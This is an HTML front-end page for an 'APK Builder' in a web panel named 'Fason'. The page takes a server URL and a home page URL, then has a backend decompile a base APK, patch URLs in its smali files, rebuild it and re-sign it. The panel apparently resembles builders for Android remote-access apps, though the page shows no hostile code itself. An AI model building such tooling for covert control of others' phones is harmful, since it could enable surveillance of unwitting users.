<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>APK Builder</title>
<link rel="stylesheet" href="/css/style.css">

<style>
.url-info {
    background: var(--card-secondary, #1e2a3a);
    border-radius: 8px;
    padding: 12px 16px;
    margin-top: 10px;
    font-size: 13px;
}
.url-info .label { color: var(--text-muted, #888); margin-bottom: 4px; }
.url-info .value { color: var(--accent, #4CAF50); font-family: monospace; word-break: break-all; }
.url-info .row { display: flex; gap: 20px; flex-wrap: wrap; }
.url-info .col { flex: 1; min-width: 120px; }

.auto-detect-btn {
    background: var(--secondary, #2196F3);
    color: #fff;
    border: none;
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 13px;
    margin-left: 10px;
    transition: background 0.2s;
}
.auto-detect-btn:hover { background: var(--secondary-dark, #1976D2); }

.input-group { display: flex; align-items: center; gap: 10px; }
.input-group input { flex: 1; }

.status-badge {
    display: inline-block;
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
    font-weight: 600;
}
.status-badge.http { background: #ff9800; color: #000; }
.status-badge.https { background: #4CAF50; color: #fff; }

.section-divider { border-top: 1px solid var(--border, #333); margin: 20px 0; padding-top: 20px; }

.section-title {
    font-size: 14px;
    color: var(--text-muted, #888);
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.section-title::before {
    content: '';
    width: 4px;
    height: 14px;
    background: var(--accent, #4CAF50);
    border-radius: 2px;
}

.optional-tag {
    background: var(--card-secondary, #1e2a3a);
    color: var(--text-muted, #888);
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
}

.hint-text { font-size: 12px; color: var(--text-muted, #888); margin-top: 6px; }

.progress-bar {
    height: 8px;
    background: #222;
    border-radius: 6px;
    overflow: hidden;
    margin-bottom: 10px;
}
.progress-fill {
    height: 100%;
    width: 0%;
    background: var(--accent, #4CAF50);
    transition: width 0.3s ease;
}

.info-card p {
    font-size: 13px;
    color: var(--text-muted, #888);
    line-height: 1.6;
}
</style>
</head>

<body>

<nav class="navbar">
    <a href="/" class="brand"><span class="fs-icon-sm">FS</span> Fason</a>
    <div class="nav-links">
        <a href="/">Dashboard</a>
        <a href="/builder" class="active">Builder</a>
        <a href="/logs">Logs</a>
        <a href="/logout">Logout</a>
    </div>
</nav>

<main class="container">

<div class="card builder-card">
    <h2>APK Builder</h2>
    <p class="subtitle">Configure and build your APK with custom server settings</p>

    <div class="section-title">Server Configuration</div>

    <div class="form-group">
        <label for="serverUrl">Server URL <span class="required">*</span></label>
        <div class="input-group">
            <input type="text" id="serverUrl" placeholder="http://192.168.1.100:22533" autocomplete="off">
            <button class="auto-detect-btn" id="autoDetectBtn">Auto Detect</button>
        </div>

        <div id="urlInfo" class="url-info hidden">
            <div class="row">
                <div class="col">
                    <div class="label">Protocol</div>
                    <div class="value" id="protocolValue">-</div>
                </div>
                <div class="col">
                    <div class="label">Host</div>
                    <div class="value" id="hostValue">-</div>
                </div>
                <div class="col">
                    <div class="label">Port</div>
                    <div class="value" id="portValue">-</div>
                </div>
            </div>
        </div>
    </div>

    <div class="section-divider"></div>

    <div class="section-title">
        App Appearance <span class="optional-tag">Optional</span>
    </div>

    <div class="form-group">
        <label for="homePageUrl">Home Page URL</label>
        <input type="text" id="homePageUrl" placeholder="https://google.com">
        <p class="hint-text">Webpage that opens when the app starts. Leave empty for default.</p>
    </div>

    <button id="buildBtn" class="btn primary">
        <span class="icon">⚙</span> Build APK
    </button>

    <div id="progress" class="hidden">
        <div class="progress-bar">
            <div id="progressFill" class="progress-fill"></div>
        </div>
        <p id="progressText">Preparing...</p>
    </div>

    <div id="result" class="hidden">
        <div class="success-icon">✓</div>
        <p>APK Built Successfully!</p>
        <a href="/build.s.apk" class="btn success" download>
            <span class="icon">↓</span> Download APK
        </a>
    </div>

    <div id="error" class="hidden">
        <div class="error-icon">✕</div>
        <p id="errorText"></p>
    </div>
</div>

<div class="card info-card">
    <h3>Requirements</h3>
    <ul>
        <li>Java JDK 8+ installed</li>
        <li>apktool.jar in factory folder</li>
        <li>uber-apk-signer.jar in factory folder</li>
    </ul>

    <h3>Build Process</h3>
    <ol>
        <li>Decompile base APK</li>
        <li>Patch server & home page</li>
        <li>Rebuild APK</li>
        <li>Sign APK</li>
    </ol>

    <h3>How It Works</h3>
    <p>
        The system scans all smali files, replaces default URLs dynamically,
        rebuilds the APK, and signs it automatically using apktool and uber-apk-signer.
    </p>
</div>

</main>

<script>
const $ = id => document.getElementById(id);

const serverUrlInput = $('serverUrl');
const homePageUrlInput = $('homePageUrl');
const buildBtn = $('buildBtn');
const autoDetectBtn = $('autoDetectBtn');
const urlInfo = $('urlInfo');
const progress = $('progress');
const progressFill = $('progressFill');
const progressText = $('progressText');
const result = $('result');
const error = $('error');
const errorText = $('errorText');

let polling = null;

// short: parse url
function parseAndDisplayUrl(url) {
    if (!url) { urlInfo.classList.add('hidden'); return null; }
    try {
        if (!url.startsWith('http')) url = 'http://' + url;
        const u = new URL(url);
        $('protocolValue').innerHTML =
            `<span class="status-badge ${u.protocol.replace(':','')}">${u.protocol.replace(':','').toUpperCase()}</span>`;
        $('hostValue').textContent = u.hostname;
        $('portValue').textContent = u.port || (u.protocol==='https:'?'443':'80');
        urlInfo.classList.remove('hidden');
        return true;
    } catch { urlInfo.classList.add('hidden'); return null; }
}

// short: auto detect
autoDetectBtn.onclick = () => {
    serverUrlInput.value = window.location.origin;
    parseAndDisplayUrl(window.location.origin);
};

serverUrlInput.addEventListener('input', e => parseAndDisplayUrl(e.target.value));
autoDetectBtn.click();

// short: build
buildBtn.onclick = async () => {
    const serverUrl = serverUrlInput.value.trim();
    const homePageUrl = homePageUrlInput.value.trim();

    if (!parseAndDisplayUrl(serverUrl)) return alert('Invalid server URL');

    buildBtn.disabled = true;
    buildBtn.innerHTML = '⏳ Building...';
    progress.classList.remove('hidden');
    result.classList.add('hidden');
    error.classList.add('hidden');
    progressFill.style.width = '0%';

    polling = setInterval(async () => {
        try {
            const res = await fetch('/builder/progress');
            const p = (await res.json()).progress || {};
            const steps = { java:5, decompile:20, patch:45, build:70, sign:90, done:100 };
            progressFill.style.width = (steps[p.step]||0) + '%';
            progressText.textContent = p.message || 'Processing...';
        } catch {}
    }, 500);

    try {
        const res = await fetch('/builder', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({serverUrl,homePageUrl})
        });
        const data = await res.json();
        clearInterval(polling);

        if (data.error) {
            error.classList.remove('hidden');
            errorText.textContent = data.error;
        } else {
            progress.classList.add('hidden');
            result.classList.remove('hidden');
        }
    } catch(e) {
        clearInterval(polling);
        error.classList.remove('hidden');
        errorText.textContent = e.message;
    }

    buildBtn.disabled = false;
    buildBtn.innerHTML = '<span class="icon">⚙</span> Build APK';
};
</script>

</body>
</html>